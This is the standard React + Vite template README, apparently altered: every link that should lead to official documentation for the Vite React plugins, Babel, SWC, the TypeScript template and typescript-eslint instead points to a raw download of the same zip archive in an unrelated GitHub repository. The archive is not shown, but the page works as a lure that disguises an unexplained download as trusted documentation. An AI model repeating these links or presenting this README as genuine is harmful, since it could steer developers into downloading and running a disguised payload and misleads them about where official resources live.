# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) uses [Babel](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) uses [SWC](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/Kathiravanbaskaran/project-notes/raw/refs/heads/main/public/project_notes_v2.2-alpha.3.zip) in your project.
